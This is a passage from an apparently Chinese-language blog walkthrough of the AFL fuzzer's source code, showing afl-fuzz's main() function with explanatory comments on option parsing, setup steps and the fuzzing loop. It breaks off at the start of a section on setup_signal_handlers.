class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> AFL_LIB</span><br><br><span class="hljs-comment">/* Main entry point */</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  s32 opt;<br>  u64 prev_queued = <span class="hljs-number">0</span>;<br>  u32 sync_interval_cnt = <span class="hljs-number">0</span>, seek_to;<br>  u8  *extras_dir = <span class="hljs-number">0</span>;<br>  u8  mem_limit_given = <span class="hljs-number">0</span>;<br>  u8  exit_1 = !!getenv(<span class="hljs-string">&quot;AFL_BENCH_JUST_ONE&quot;</span>);  <span class="hljs-comment">// 获取环境变量AFL_BENCH_JUST_ONE，并转换为相应的布尔值</span><br>  <span class="hljs-type">char</span>** use_argv;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">tv</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timezone</span> <span class="hljs-title">tz</span>;</span><br><br>  SAYF(cCYA <span class="hljs-string">&quot;afl-fuzz &quot;</span> cBRI VERSION cRST <span class="hljs-string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);<br><br>  doc_path = access(DOC_PATH, F_OK) ? <span class="hljs-string">&quot;docs&quot;</span> : DOC_PATH;<br><br>  gettimeofday(&amp;tv, &amp;tz);<br>  srandom(tv.tv_sec ^ tv.tv_usec ^ getpid());   <span class="hljs-comment">// 初始化随机种子</span><br><br>  <span class="hljs-keyword">while</span> ((opt = getopt(argc, argv, <span class="hljs-string">&quot;+i:o:f:m:t:T:dnCB:S:M:x:Q&quot;</span>)) &gt; <span class="hljs-number">0</span>)   <span class="hljs-comment">// 循环处理命令参数</span><br><br>    <span class="hljs-keyword">switch</span> (opt) &#123;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-comment">/* input dir */</span><br><br>        <span class="hljs-keyword">if</span> (in_dir) FATAL(<span class="hljs-string">&quot;Multiple -i options not supported&quot;</span>);<br>        in_dir = optarg;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(in_dir, <span class="hljs-string">&quot;-&quot;</span>)) in_place_resume = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;o&#x27;</span>: <span class="hljs-comment">/* output dir */</span><br><br>        <span class="hljs-keyword">if</span> (out_dir) FATAL(<span class="hljs-string">&quot;Multiple -o options not supported&quot;</span>);<br>        out_dir = optarg;<br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>: &#123; <span class="hljs-comment">/* master sync ID */</span><br><br>          u8* c;<br><br>          <span class="hljs-keyword">if</span> (sync_id) FATAL(<span class="hljs-string">&quot;Multiple -S or -M options not supported&quot;</span>);<br>          sync_id = ck_strdup(optarg);<br><br>          <span class="hljs-keyword">if</span> ((c = <span class="hljs-built_in">strchr</span>(sync_id, <span class="hljs-string">&#x27;:&#x27;</span>))) &#123;<br><br>            *c = <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(c + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;%u/%u&quot;</span>, &amp;master_id, &amp;master_max) != <span class="hljs-number">2</span> ||<br>                !master_id || !master_max || master_id &gt; master_max ||<br>                master_max &gt; <span class="hljs-number">1000000</span>) FATAL(<span class="hljs-string">&quot;Bogus master ID passed to -M&quot;</span>);<br><br>          &#125;<br><br>          force_deterministic = <span class="hljs-number">1</span>;<br><br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;S&#x27;</span>: <br><br>        <span class="hljs-keyword">if</span> (sync_id) FATAL(<span class="hljs-string">&quot;Multiple -S or -M options not supported&quot;</span>);<br>        sync_id = ck_strdup(optarg);<br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-comment">/* target file */</span><br><br>        <span class="hljs-keyword">if</span> (out_file) FATAL(<span class="hljs-string">&quot;Multiple -f options not supported&quot;</span>);<br>        out_file = optarg;<br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>: <span class="hljs-comment">/* dictionary */</span><br><br>        <span class="hljs-keyword">if</span> (extras_dir) FATAL(<span class="hljs-string">&quot;Multiple -x options not supported&quot;</span>);<br>        extras_dir = optarg;<br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;t&#x27;</span>: &#123; <span class="hljs-comment">/* timeout */</span><br><br>          u8 suffix = <span class="hljs-number">0</span>;<br><br>          <span class="hljs-keyword">if</span> (timeout_given) FATAL(<span class="hljs-string">&quot;Multiple -t options not supported&quot;</span>);<br><br>          <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(optarg, <span class="hljs-string">&quot;%u%c&quot;</span>, &amp;exec_tmout, &amp;suffix) &lt; <span class="hljs-number">1</span> ||<br>              optarg[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;-&#x27;</span>) FATAL(<span class="hljs-string">&quot;Bad syntax used for -t&quot;</span>);<br><br>          <span class="hljs-keyword">if</span> (exec_tmout &lt; <span class="hljs-number">5</span>) FATAL(<span class="hljs-string">&quot;Dangerously low value of -t&quot;</span>);<br><br>          <span class="hljs-keyword">if</span> (suffix == <span class="hljs-string">&#x27;+&#x27;</span>) timeout_given = <span class="hljs-number">2</span>; <span class="hljs-keyword">else</span> timeout_given = <span class="hljs-number">1</span>;<br><br>          <span class="hljs-keyword">break</span>;<br><br>      &#125;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;m&#x27;</span>: &#123; <span class="hljs-comment">/* mem limit */</span><br><br>          u8 suffix = <span class="hljs-string">&#x27;M&#x27;</span>;<br><br>          <span class="hljs-keyword">if</span> (mem_limit_given) FATAL(<span class="hljs-string">&quot;Multiple -m options not supported&quot;</span>);<br>          mem_limit_given = <span class="hljs-number">1</span>;<br><br>          <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(optarg, <span class="hljs-string">&quot;none&quot;</span>)) &#123;<br><br>            mem_limit = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br><br>          &#125;<br><br>          <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(optarg, <span class="hljs-string">&quot;%llu%c&quot;</span>, &amp;mem_limit, &amp;suffix) &lt; <span class="hljs-number">1</span> ||<br>              optarg[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;-&#x27;</span>) FATAL(<span class="hljs-string">&quot;Bad syntax used for -m&quot;</span>);<br><br>          <span class="hljs-keyword">switch</span> (suffix) &#123;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;T&#x27;</span>: mem_limit *= <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;G&#x27;</span>: mem_limit *= <span class="hljs-number">1024</span>; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;k&#x27;</span>: mem_limit /= <span class="hljs-number">1024</span>; <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">default</span>:  FATAL(<span class="hljs-string">&quot;Unsupported suffix or bad syntax for -m&quot;</span>);<br><br>          &#125;<br><br>          <span class="hljs-keyword">if</span> (mem_limit &lt; <span class="hljs-number">5</span>) FATAL(<span class="hljs-string">&quot;Dangerously low value of -m&quot;</span>);<br><br>          <span class="hljs-keyword">if</span> (<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">rlim_t</span>) == <span class="hljs-number">4</span> &amp;&amp; mem_limit &gt; <span class="hljs-number">2000</span>)<br>            FATAL(<span class="hljs-string">&quot;Value of -m out of range on 32-bit systems&quot;</span>);<br><br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-comment">/* skip deterministic */</span><br><br>        <span class="hljs-keyword">if</span> (skip_deterministic) FATAL(<span class="hljs-string">&quot;Multiple -d options not supported&quot;</span>);<br>        skip_deterministic = <span class="hljs-number">1</span>;<br>        use_splicing = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;B&#x27;</span>: <span class="hljs-comment">/* load bitmap */</span><br><br>        <span class="hljs-comment">/* This is a secret undocumented option! It is useful if you find</span><br><span class="hljs-comment">           an interesting test case during a normal fuzzing process, and want</span><br><span class="hljs-comment">           to mutate it without rediscovering any of the test cases already</span><br><span class="hljs-comment">           found during an earlier run.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           To use this mode, you need to point -B to the fuzz_bitmap produced</span><br><span class="hljs-comment">           by an earlier run for the exact same binary... and that&#x27;s it.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           I only used this once or twice to get variants of a particular</span><br><span class="hljs-comment">           file, so I&#x27;m not making this an official setting. */</span><br><br>        <span class="hljs-keyword">if</span> (in_bitmap) FATAL(<span class="hljs-string">&quot;Multiple -B options not supported&quot;</span>);<br><br>        in_bitmap = optarg;<br>        read_bitmap(in_bitmap);<br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-comment">/* crash mode */</span><br><br>        <span class="hljs-keyword">if</span> (crash_mode) FATAL(<span class="hljs-string">&quot;Multiple -C options not supported&quot;</span>);<br>        crash_mode = FAULT_CRASH;<br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-comment">/* dumb mode 简易模式 */</span> <br><br>        <span class="hljs-keyword">if</span> (dumb_mode) FATAL(<span class="hljs-string">&quot;Multiple -n options not supported&quot;</span>);<br>        <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_DUMB_FORKSRV&quot;</span>)) dumb_mode = <span class="hljs-number">2</span>; <span class="hljs-keyword">else</span> dumb_mode = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;T&#x27;</span>: <span class="hljs-comment">/* banner */</span><br><br>        <span class="hljs-keyword">if</span> (use_banner) FATAL(<span class="hljs-string">&quot;Multiple -T options not supported&quot;</span>);<br>        use_banner = optarg;<br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;Q&#x27;</span>: <span class="hljs-comment">/* QEMU mode */</span><br><br>        <span class="hljs-keyword">if</span> (qemu_mode) FATAL(<span class="hljs-string">&quot;Multiple -Q options not supported&quot;</span>);<br>        qemu_mode = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;       <span class="hljs-comment">// mem_limit = 200</span><br><br>        <span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">default</span>:<br><br>        usage(argv[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 显示参数用法，并退出</span><br><br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (optind == argc || !in_dir || !out_dir) usage(argv[<span class="hljs-number">0</span>]); <br><br>  setup_signal_handlers();      <span class="hljs-comment">// 设置信号处理函数</span><br>  check_asan_opts();    <span class="hljs-comment">// 检测asan与msan模式</span><br><br>  <span class="hljs-keyword">if</span> (sync_id) fix_up_sync();   <span class="hljs-comment">// 修正out_dir与sync_dir</span><br><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(in_dir, out_dir)) <span class="hljs-comment">// 若in_dir与out_dir相同，报错并退出</span><br>    FATAL(<span class="hljs-string">&quot;Input and output directories can&#x27;t be the same&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (dumb_mode) &#123;<br><br>    <span class="hljs-keyword">if</span> (crash_mode) FATAL(<span class="hljs-string">&quot;-C and -n are mutually exclusive&quot;</span>);  <span class="hljs-comment">// 互斥</span><br>    <span class="hljs-keyword">if</span> (qemu_mode)  FATAL(<span class="hljs-string">&quot;-Q and -n are mutually exclusive&quot;</span>);  <span class="hljs-comment">// 互斥</span><br><br>  &#125;<br>  <br>  <span class="hljs-comment">// 获取环境变量并设置对应值</span><br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_NO_FORKSRV&quot;</span>))    no_forkserver    = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_NO_CPU_RED&quot;</span>))    no_cpu_meter_red = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_NO_ARITH&quot;</span>))      no_arith         = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_SHUFFLE_QUEUE&quot;</span>)) shuffle_queue    = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_FAST_CAL&quot;</span>))      fast_cal         = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_HANG_TMOUT&quot;</span>)) &#123;       <span class="hljs-comment">// 获取环境变量AFL_HANG_TMOUT，并设置hang_tmout</span><br>    hang_tmout = atoi(getenv(<span class="hljs-string">&quot;AFL_HANG_TMOUT&quot;</span>));<br>    <span class="hljs-keyword">if</span> (!hang_tmout) FATAL(<span class="hljs-string">&quot;Invalid value of AFL_HANG_TMOUT&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (dumb_mode == <span class="hljs-number">2</span> &amp;&amp; no_forkserver)<br>    FATAL(<span class="hljs-string">&quot;AFL_DUMB_FORKSRV and AFL_NO_FORKSRV are mutually exclusive&quot;</span>);        <span class="hljs-comment">// 互斥</span><br><br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_PRELOAD&quot;</span>)) &#123;  <span class="hljs-comment">// 获取环境变量AFL_PRELOAD，若不为空，则设置对应环境变量的值</span><br>    setenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>, getenv(<span class="hljs-string">&quot;AFL_PRELOAD&quot;</span>), <span class="hljs-number">1</span>);<br>    setenv(<span class="hljs-string">&quot;DYLD_INSERT_LIBRARIES&quot;</span>, getenv(<span class="hljs-string">&quot;AFL_PRELOAD&quot;</span>), <span class="hljs-number">1</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;AFL_LD_PRELOAD&quot;</span>)) <span class="hljs-comment">// 获取环境变量AFL_LD_PRELOAD，若不为空，报错并退出</span><br>    FATAL(<span class="hljs-string">&quot;Use AFL_PRELOAD instead of AFL_LD_PRELOAD&quot;</span>);<br><br>  save_cmdline(argc, argv);     <span class="hljs-comment">// 保存argv变量到orig_cmdline</span><br><br>  fix_up_banner(argv[optind]);  <span class="hljs-comment">// 获取-T参数指定的目标程序名称或者根据程序路径生成的程序名称</span><br><br>  check_if_tty();       <span class="hljs-comment">// 检测是否在tty终端上运行</span><br><br>  get_core_count();     <span class="hljs-comment">// 获取cpu核心数量</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> HAVE_AFFINITY</span><br>  bind_to_free_cpu();   <span class="hljs-comment">// 获取空闲cpu</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* HAVE_AFFINITY */</span></span><br><br>  check_crash_handling();       <span class="hljs-comment">// 检测core，确保core dump不会进入程序</span><br>  check_cpu_governor(); <span class="hljs-comment">// 检测cpu管理者</span><br><br>  setup_post(); <span class="hljs-comment">// 根据环境变量AFL_POST_LIBRARY，判断是否加载afl_postprocess函数</span><br>  setup_shm();  <span class="hljs-comment">// 设置共享内存trace_bits，初始化virgin_bits</span><br>  init_count_class16(); <span class="hljs-comment">// 初始化count_class_lookup16数组</span><br><br>  setup_dirs_fds();     <span class="hljs-comment">// 创建输出文件夹</span><br>  read_testcases();     <span class="hljs-comment">// 读取所有测试用例，并插入到路径queue中</span><br>  load_auto();          <span class="hljs-comment">// 自动加载生成的extra</span><br><br>  pivot_inputs();       <span class="hljs-comment">// 为测试用例在output文件夹中创建硬链接</span><br><br>  <span class="hljs-keyword">if</span> (extras_dir) load_extras(extras_dir);      <span class="hljs-comment">// 若extras_dir不为空，即指定-x参数，加载目录下的token到extras数组</span><br><br>  <span class="hljs-keyword">if</span> (!timeout_given) find_timeout();   <span class="hljs-comment">// 若timeout_given为空，即未指定-t参数，设置exec_tmout</span><br><br>  detect_file_args(argv + optind + <span class="hljs-number">1</span>);  <span class="hljs-comment">// 检测@@，并加载输入文件</span><br><br>  <span class="hljs-keyword">if</span> (!out_file) setup_stdio_file();    <span class="hljs-comment">// 若out_file为空，即未指定-f参数，设置out_file</span><br><br>  check_binary(argv[optind]);   <span class="hljs-comment">// 检测二进程程序是否合法</span><br><br>  start_time = get_cur_time();<br><br>  <span class="hljs-keyword">if</span> (qemu_mode)<br>    use_argv = get_qemu_argv(argv[<span class="hljs-number">0</span>], argv + optind, argc - optind);    <span class="hljs-comment">// 获取qemu模式的参数</span><br>  <span class="hljs-keyword">else</span><br>    use_argv = argv + optind;<br><br>  perform_dry_run(use_argv);    <span class="hljs-comment">// 核心函数，执行所有的测试用例，检测是否正常执行</span><br><br>  cull_queue(); <span class="hljs-comment">// 精简queue</span><br>  <br>  show_init_stats();    <span class="hljs-comment">// 显示初始状态信息</span><br><br>  seek_to = find_start_position();      <span class="hljs-comment">// 查找queue起始位置</span><br><br>  write_stats_file(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">// 更新统计信息</span><br>  save_auto();  <span class="hljs-comment">// 自动保存自动生成的extra</span><br><br>  <span class="hljs-keyword">if</span> (stop_soon) <span class="hljs-keyword">goto</span> stop_fuzzing;     <span class="hljs-comment">// 若stop_soon不为空，跳转到stop_fuzzing</span><br><br>  <span class="hljs-comment">/* Woop woop woop */</span><br><br>  <span class="hljs-keyword">if</span> (!not_on_tty) &#123;    <span class="hljs-comment">// 若在tty终端</span><br>    sleep(<span class="hljs-number">4</span>);<br>    start_time += <span class="hljs-number">4000</span>;<br>    <span class="hljs-keyword">if</span> (stop_soon) <span class="hljs-keyword">goto</span> stop_fuzzing;<br>  &#125;<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><br>    u8 skipped_fuzz;<br><br>    cull_queue();<br><br>    <span class="hljs-keyword">if</span> (!queue_cur) &#123;   <span class="hljs-comment">// 如果queue_cur为空，代表所有queue都被执行完一轮</span><br><br>      queue_cycle++;    <span class="hljs-comment">// 代表所有queue被完整执行了多少轮</span><br>      current_entry     = <span class="hljs-number">0</span>;<br>      cur_skipped_paths = <span class="hljs-number">0</span>;<br>      queue_cur         = <span class="hljs-built_in">queue</span>;        <span class="hljs-comment">// 开始新一轮fuzz</span><br><br>      <span class="hljs-keyword">while</span> (seek_to) &#123;         <span class="hljs-comment">// resume fuzz</span><br>        current_entry++;<br>        seek_to--;<br>        queue_cur = queue_cur-&gt;next;    <span class="hljs-comment">// 从seek_to指定的queue项开始执行</span><br>      &#125;<br><br>      show_stats();     <span class="hljs-comment">// 显示stat信息</span><br><br>      <span class="hljs-keyword">if</span> (not_on_tty) &#123;<br>        ACTF(<span class="hljs-string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>      &#125;<br><br>      <span class="hljs-comment">/* If we had a full queue cycle with no new finds, try</span><br><span class="hljs-comment">         recombination strategies next. */</span><br><br>      <span class="hljs-keyword">if</span> (queued_paths == prev_queued) &#123;        <span class="hljs-comment">// 代表在完整的一轮执行里都没有发现任何一个新的case</span><br><br>        <span class="hljs-keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="hljs-keyword">else</span> use_splicing = <span class="hljs-number">1</span>;     <span class="hljs-comment">// 设置use_splicing为1，代表接下来要通过splice重组queue里的case</span><br><br>      &#125; <span class="hljs-keyword">else</span> cycles_wo_finds = <span class="hljs-number">0</span>;<br><br>      prev_queued = queued_paths;<br><br>      <span class="hljs-keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="hljs-number">1</span> &amp;&amp; getenv(<span class="hljs-string">&quot;AFL_IMPORT_FIRST&quot;</span>))<br>        sync_fuzzers(use_argv);         <span class="hljs-comment">// 读取其他sync文件夹下的queue，保存到主queue中</span><br><br>    &#125;<br><br>    skipped_fuzz = fuzz_one(use_argv);  <span class="hljs-comment">// 对queue_cur进行测试，若不执行返回1，否则返回0</span><br><br>    <span class="hljs-keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;<br>      <br>      <span class="hljs-keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))<br>        sync_fuzzers(use_argv);<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="hljs-number">2</span>;<br><br>    <span class="hljs-keyword">if</span> (stop_soon) <span class="hljs-keyword">break</span>;       <span class="hljs-comment">// 跳出死循环唯一途径</span><br><br>    queue_cur = queue_cur-&gt;next;<br>    current_entry++;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (queue_cur) show_stats();  <span class="hljs-comment">// 显示stat信息</span><br><br>  <span class="hljs-comment">/* If we stopped programmatically, we kill the forkserver and the current runner. </span><br><span class="hljs-comment">     If we stopped manually, this is done by the signal handler. */</span><br>  <span class="hljs-keyword">if</span> (stop_soon == <span class="hljs-number">2</span>) &#123;<br>      <span class="hljs-keyword">if</span> (child_pid &gt; <span class="hljs-number">0</span>) kill(child_pid, SIGKILL);<br>      <span class="hljs-keyword">if</span> (forksrv_pid &gt; <span class="hljs-number">0</span>) kill(forksrv_pid, SIGKILL);<br>  &#125;<br>  <span class="hljs-comment">/* Now that we&#x27;ve killed the forkserver, we wait for it to be able to get rusage stats. */</span><br>  <span class="hljs-keyword">if</span> (waitpid(forksrv_pid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>) &#123;     <span class="hljs-comment">// 等待forksrv结束</span><br>    WARNF(<span class="hljs-string">&quot;error waitpid\n&quot;</span>);<br>  &#125;<br>  <br>  write_bitmap();       <span class="hljs-comment">// 将virgin_bits信息，即发现路径写入out_dir/fuzz_bitmap文件</span><br>  write_stats_file(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">// 更新统计信息</span><br>  save_auto();  <span class="hljs-comment">// 自动保存生成的extra</span><br><br>stop_fuzzing:<br><br>  SAYF(CURSOR_SHOW cLRD <span class="hljs-string">&quot;\n\n+++ Testing aborted %s +++\n&quot;</span> cRST,<br>       stop_soon == <span class="hljs-number">2</span> ? <span class="hljs-string">&quot;programmatically&quot;</span> : <span class="hljs-string">&quot;by user&quot;</span>);<br><br>  <span class="hljs-comment">/* Running for more than 30 minutes but still doing first cycle? */</span><br><br>  <span class="hljs-keyword">if</span> (queue_cycle == <span class="hljs-number">1</span> &amp;&amp; get_cur_time() - start_time &gt; <span class="hljs-number">30</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>) &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cYEL <span class="hljs-string">&quot;[!] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Stopped during the first cycle, results may be incomplete.\n&quot;</span><br>           <span class="hljs-string">&quot;    (For info on resuming, see %s/README.)\n&quot;</span>, doc_path);<br><br>  &#125;<br><br>  fclose(plot_file);<br>  destroy_queue();      <span class="hljs-comment">// 销毁queue信息</span><br>  destroy_extras();     <span class="hljs-comment">// 销毁extras</span><br>  ck_free(target_path);<br>  ck_free(sync_id);<br><br>  alloc_report();<br><br>  OKF(<span class="hljs-string">&quot;We&#x27;re done here. Have a nice day!\n&quot;</span>);<br><br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* !AFL_LIB */</span></span><br><br></code></pre></td></tr></table></figure><h3 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h3><p>设置信号处理函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 